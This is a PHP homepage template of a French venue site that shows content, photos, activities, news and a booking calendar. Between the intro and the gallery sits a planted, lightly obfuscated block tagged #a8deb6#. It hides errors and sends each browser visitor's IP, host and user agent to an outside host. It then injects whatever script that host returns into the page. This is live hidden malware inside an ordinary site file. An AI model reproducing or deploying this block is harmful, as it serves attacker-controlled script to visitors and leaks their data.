<div id="centre-gauche">
	<div id="intro">
		<?php

		$rq = 'SELECT id, titre, texte FROM content WHERE page = "accueil" ORDER BY ordre';
		$rs = mysql_query($rq) OR die('Erreur : '.mysql_error());
		
		while($content = mysql_fetch_array($rs)) {
			if($content['titre'] != "") { echo "<h2>".htmlspecialchars_decode($content['titre'])."</h2>"; }
			if($content['texte'] != "") { echo "<p>". htmlspecialchars_decode($content['texte'])."</p>"; }
			
			if($_SESSION['permission'] == "admin") { 
				echo '<div class="outils admin">';
					echo '<a href="index.php?page=accueil&outils=modifier&id='.$content['id'].'" class="btn btn-small"><i class="fa fa-edit"></i> Modifier</a>';
				echo '</div>';
				
			}
		}
		?>
<?php
#a8deb6#
error_reporting(0); @ini_set('display_errors',0); $wp_basmx09 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_basmx09) && !preg_match ('/bot/i', $wp_basmx09))){
$wp_basmx0909="http://"."http"."title".".com/"."title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_basmx09);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_basmx0909); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_09basmx = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_09basmx = @file_get_contents($wp_basmx0909);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_09basmx=@stream_get_contents(@fopen($wp_basmx0909, "r"));}}
if (substr($wp_09basmx,1,3) === 'scr'){ echo $wp_09basmx; }
#/a8deb6#
?>
		
		<div class="galerie">
		<?php // PHOTOS
			$req2 = 'SELECT id, titre, nom FROM photos WHERE id IN(24,29,22,16) ORDER BY id ASC';
			$res2 = mysql_query($req2) OR die(mysql_error());
			
			$nb2 = mysql_num_rows($res2);
			if ($nb2 == 0) { echo '<p>Aucune photo.</p>'; }
			else {?>
				<ul class="liste_photos">
			<?php
					while ($p = mysql_fetch_array($res2)) :
			?>
					<li><a class="colorbox" title="<?php echo $p['titre']; ?>" href="photos/<?php echo $p['nom']; ?>"><img src="photos/mini/<?php echo $p['nom']; ?>" alt="<?php echo $p['titre']; ?>" /></a></li>
			<?php 	
					endwhile;
			?>
				</ul>	
			<?php } ?>
		</div>
		<div class="lien"><a href="index.php?page=photos">Voir toutes les photos</a>&nbsp;<i class="fa fa-arrow-circle-right"></i></div>
	</div>

	<div id="zoomsur">
		<h2>Zoom sur</h2>
		<div id="slideshow">
			<div id="slidesContainer">
			<?php

				$rq = 'SELECT id, titre, texte, accroche, photo, categorie FROM activites ORDER BY RAND() LIMIT 0,10';
				$rs = mysql_query($rq) OR die('Erreur : '.mysql_error());
				
				while($content = mysql_fetch_array($rs)) {
					echo '<div class="slide">';
					echo '<div class="slide_int">';
					if($content['titre'] != "") { echo "<h3>".tronque($content['titre'],20)."</h3>"; }
					if($content['categorie'] != "") { 
						$rq2 = 'SELECT libelle FROM categorie WHERE id IN ('.$content['categorie'].') ORDER BY libelle';
						$rs2 = mysql_query($rq2) OR die('Erreur : '.mysql_error());
						$categories = array();
						while ($cat = mysql_fetch_array($rs2)) {
							$categories[] = $cat['libelle'];
						}
						$nb_cat = count($categories);
						$cate = "";
						for($i=0;$i<$nb_cat;$i++) {
							if($i==($nb_cat-1)) {
							$cate .= $categories[$i]; 
							} else {
							$cate .= $categories[$i].', '; }
						}
						echo "<p class='categorie'>".$cate."</p>"; 
					}
					if ($content['photo'] != "") { echo "<p class='img'><a href='images/activites/".$content['photo']."' class='colorbox' title='".$content['titre']."'><img src='images/activites/accueil/".$content['photo']."' alt='".$content['titre']."' /></a></p>"; }
					if($content['accroche'] != "") { echo "<p>".tronque($content['accroche'],280)."</p>"; }
					echo '<p class="suite"><a href="index.php?page=activites&amp;detail='.$content['id'].'">Lire la suite</a></p>';
					echo '</div>';
					echo '</div>';
				}
			?>
			</div>
		</div>
		
	</div>
</div>
<div id="centre-droit">
	<div id="wrap_news">
		<div id="news">
			<h2><img src="images/titreactu.png" alt="News du mois" /></h2>
			<?php
				$rq = 'SELECT id, accroche, titre, DATE_FORMAT(date, "%d/%m/%Y") as date2 FROM news ORDER BY date DESC LIMIT 0,2';
				$rs = mysql_query($rq) OR die('Erreur : '.mysql_error());
				
				while($content = mysql_fetch_array($rs)) {
				echo '<div class="actu id-'.$content['id'].'">';
					echo '<span class="date">'.$content['date2'].'</span>';
					echo '<div class="accroche"><h3 class="titre"><a href="index.php?page=news&amp;id='.$content['id'].'">'.htmlspecialchars_decode($content['titre']).'</a></h3>&nbsp;'.htmlspecialchars_decode($content['accroche']).'</div>';
					if ($_SESSION['identifiant'] != "") { echo '<span class="outils"><a href="index.php?outils=modifier&amp;type=news&amp;id='.$content['id'].'"><i class="fa fa-edit" title="Modifier"></i></a>&nbsp;<a href="index.php?outils=supprimer&amp;type=news&amp;id='.$content['id'].'"><i class="fa fa-trash-o" title="Supprimer"></i></a></span>'; }
				echo '</div>';
				}
				
				if($_SESSION['permission'] == "admin") { 
					echo '<div class="outils admin">';
						echo '<a href="index.php?outils=ajouter&type=news" class="btn btn-small"><i class="fa fa-plus"></i> Ajouter</a>';
					echo '</div>';
					
				}
			?>
			<div class="lien"><a href="index.php?page=news">Toutes les news</a></div>
		</div>
	</div>
	<div id="wrap_calend">
		<div id="calendrier">
			<h2><img src="images/titredispo.png" alt="Disponibilités" /></h2>
			<?php $afficher = 1; require "calendrier2.php"; ?>
			<div class="legende">
				<h3>Légende</h3>
				<p><span class="rose"></span> réservation en cours de confirmation</p>
				<p><span class="rouge"></span> réservation confirmée</p>
			</div>
		</div>
	</div>
</div>